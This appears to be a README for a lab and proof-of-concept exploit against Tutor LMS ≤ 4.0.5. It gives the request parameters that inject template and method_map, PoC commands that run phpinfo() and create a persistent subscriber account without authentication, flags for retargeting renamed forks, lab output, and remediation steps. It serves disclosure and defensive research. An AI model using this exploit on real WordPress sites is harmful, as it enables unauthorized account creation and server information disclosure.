# Tutor LMS ≤ 4.0.5 — Unauthenticated PHP Function Execution via `template` / `method_map` injection

A self-contained lab and a general-purpose PoC for the unauthenticated arbitrary
**zero-argument PHP function execution** in Tutor LMS (`themeum/tutor`) **≤ 4.0.5**, and its
escalation to **unauthenticated WordPress account creation** via WordPress core `edit_user()`.

> Tracked publicly by Wordfence as *"Tutor LMS ≤ 4.0.5 – Unauthenticated Remote Code Execution via
> template and data POST parameters."* The vulnerable code path is byte-identical in 4.0.4 and 4.0.5.
> For authorized security testing and research only.

---

## TL;DR

An anonymous request makes Tutor render its `single-content-loader` template with attacker-controlled
variables. That template ends in:

```php
( isset($method_map[$context]) && is_callable($method_map[$context]) ) ? $method_map[$context]() : 0;
```

Because a preceding `extract()` lets the attacker overwrite both `$method_map` and `$context`, the call
becomes **`<any callable>()` with zero arguments**, gated only by `is_callable()`.

- **Disclosure:** any printing callable — `phpinfo`, `phpcredits`, `debug_print_backtrace` — leaks
  configuration, absolute paths, and internal state.
- **Account creation (escalation):** WordPress core `edit_user()` has the signature
  `edit_user($user_id = 0)`, so a zero-argument call takes the *create* branch and reads
  `user_login` / `pass1` / `pass2` / `email` straight from `$_POST` — **creating a persistent
  subscriber account with no nonce and no capability check**, even when public registration is disabled.

This is **arbitrary zero-argument function invocation, not shell RCE** — the dispatch passes no
arguments, so functions like `system()` cannot be reached with a command string.

---

## Two entry routes (and why scope matters)

Both routes reach the *same* `tutor_load_template('archive-course-init', <attacker-influenced vars>)`
call, whose `extract()` overwrites the hard-coded template name:

| Route | Request | Auth | Scope | `edit_user` reachable? |
|-------|---------|------|-------|------------------------|
| **Front-end archive** | `GET /courses/?course_filter=1&template=single-content-loader&data[...]` | none (no nonce) | front-end page | **No** — `wp-admin/includes` not loaded |
| **admin-ajax** | `POST /wp-admin/admin-ajax.php` `action=tutor_course_filter_ajax` | nonce, but Tutor prints `_tutor_nonce` to every logged-out visitor | admin-ajax | **Yes** — `admin-ajax.php` sets `WP_ADMIN` and loads `admin.php` → `user.php` |

`edit_user()` (and other `wp-admin/includes` functions) are **only defined** inside
`/wp-admin/admin-ajax.php`, which `require`s `wp-admin/includes/admin.php` → `user.php`. On a plain
front-end page they do not exist, so `is_callable('edit_user')` is `false` there and the account-creation
escalation is only reachable through the admin-ajax route — **and only where that route is not
neutralized** by an edge WAF / mu-plugin. The PoC probes both routes and reports which scope you have.

---

## Root cause (file:line, Tutor LMS 4.0.4/4.0.5)

```
includes/tutor-template-functions.php:115  function tutor_load_template($template, $variables) {
                                     :118      extract($variables);          // clobbers $template
                                     :126      $template_file = tutor_get_template($template);
                                     :128      include $template_file;       // -> single-content-loader.php

templates/single-content-loader.php  :14      $method_map = ['lesson'=>..., 'assignment'=>...];
                                     :30      extract($data);                // clobbers $method_map + $context
                                     :71      ( isset($method_map[$context]) && is_callable($method_map[$context]) )
                                                  ? $method_map[$context]() : 0;   // <-- sink

templates/archive-course.php     :16  $get = Input::sanitize_array($_GET);      // keeps 'template','data'
                                 :24  tutor_load_template('archive-course-init', array_merge($get, [...]));   // FE route
classes/Course_Filter.php        :58  add_action('wp_ajax_nopriv_tutor_course_filter_ajax', [$this,'load_listing']);
                                :224  tutor_load_template('archive-course-init', array_merge(['loop_content_only'=>true], $sanitized_post));  // ajax route
```

`Input::sanitize_array()` / `tutor_sanitize_data()` recurse but **preserve keys**, so the attacker's
`template` and `data[...]` keys survive into `extract()`.

Full walk-through: [`docs/ANALYSIS.md`](docs/ANALYSIS.md).

---

## Lab

Portable Docker stack: WordPress 6.6 + MariaDB + Tutor LMS 4.0.4, default `twentytwentyfour` theme
(the front-end route is **theme-independent**).

```bash
cd lab
docker compose up -d db wp          # start database + WordPress
docker compose run --rm setup       # provision (idempotent): install WP, pin Tutor 4.0.4, seed a course
# target: http://localhost:8099   (override with WP_PORT=... )
# wp-admin: admin / admin-lab-pass
docker compose down -v              # tear down + delete volumes
```

The provisioner sets `users_can_register = 0` on purpose, to demonstrate the bug creates accounts even
when public registration is closed.

---

## PoC

```bash
# read-only: fingerprint, detect which routes fire, execute a zero-arg callable, disclose a path
python3 poc/tutor_methodmap_poc.py http://localhost:8099

# report whether wp-admin/includes (edit_user) is loaded on each working route
python3 poc/tutor_methodmap_poc.py http://localhost:8099 --scope-probe

# pick the callable (must PRINT to be observable; return values are discarded)
python3 poc/tutor_methodmap_poc.py http://localhost:8099 --callable debug_print_backtrace

# ESCALATION: create a persistent subscriber via edit_user() (admin-ajax route). Writes state.
python3 poc/tutor_methodmap_poc.py http://localhost:8099 --create-user --i-understand-this-creates-a-user
```

The read-only checks are non-destructive. `--create-user` writes an account and cannot self-delete —
remove it in *wp-admin → Users* afterward (the tool prints the username).

### "Similar case" reuse

Every request key is a flag, so the PoC drives any Tutor-style `extract()` → `method_map` dispatch even
if a fork renamed things:

```
--ajax-action  --template-param  --sink-template  --data-param  --context-key
--methodmap-key --filter-param  --archive-path  --nonce-name  --route {auto,frontend,ajax}
```

---

## Verified lab evidence

Against a clean WordPress 6.6 + Tutor LMS 4.0.4 install (PHP 8.3):

```
== route detection ==
  [PASS] frontend  HONOURS the injection (dispatch fires)
  [PASS] ajax      HONOURS the injection (dispatch fires)

== exec [frontend] ==   [PASS] phpinfo() executed server-side
== scope [frontend] ==  [----] wp-admin/includes NOT loaded => edit_user NOT reachable
== exec [ajax] ==       [PASS] phpinfo() executed server-side
== scope [ajax] ==      [PASS] wp-admin/includes LOADED (administrator, author, contributor, editor, subscriber)

== escalation [ajax] — edit_user() -> unauth persistent subscriber ==
  [PASS] ACCOUNT CREATED and login succeeded — unauth persistent subscriber 'poc_b3485281'

# independent wp-cli oracle
ID  user_login     roles
1   admin          administrator
4   poc_b3485281   subscriber       <-- created unauthenticated, login returns wordpress_logged_in cookie
```

---

## Remediation

Update Tutor LMS to a fixed release (≥ the version that removes the `extract()` template clobber).
Root fixes, in order of correctness:

1. **Do not `extract()` request-controlled arrays into template scope.** Pass an explicit, named
   variable allowlist to `tutor_load_template()` and to `single-content-loader.php` instead of
   `extract($variables)` / `extract($data)`.
2. **Never let a request key select the template.** Resolve `$template` from a fixed allowlist before
   `extract()` runs, and drop `template` / `data` from the caller-supplied arrays in
   `archive-course.php` and `Course_Filter::load_listing()`.
3. **Constrain the dispatch.** In `single-content-loader.php`, validate `$context` against the
   hard-coded `$method_map` keys and do not rebuild `$method_map` from `$data`.

Defense-in-depth: an edge rule that strips `template=` / `data[method_map]` from the
`tutor_course_filter_ajax` action and the `/courses/` archive blocks the primitive without a plugin
update (this is what neutralizes the admin-ajax route on some deployments).

---

## Responsible use

This repository is for **authorized** security testing, education, and defensive research. Run the PoC
only against the bundled lab or systems you own or are explicitly authorized to test. Do not point it at
third-party sites.

## References

- Wordfence: *Tutor LMS ≤ 4.0.5 – Unauthenticated RCE via template and data POST parameters.*
- Tutor LMS (`themeum/tutor`) plugin — WordPress.org.
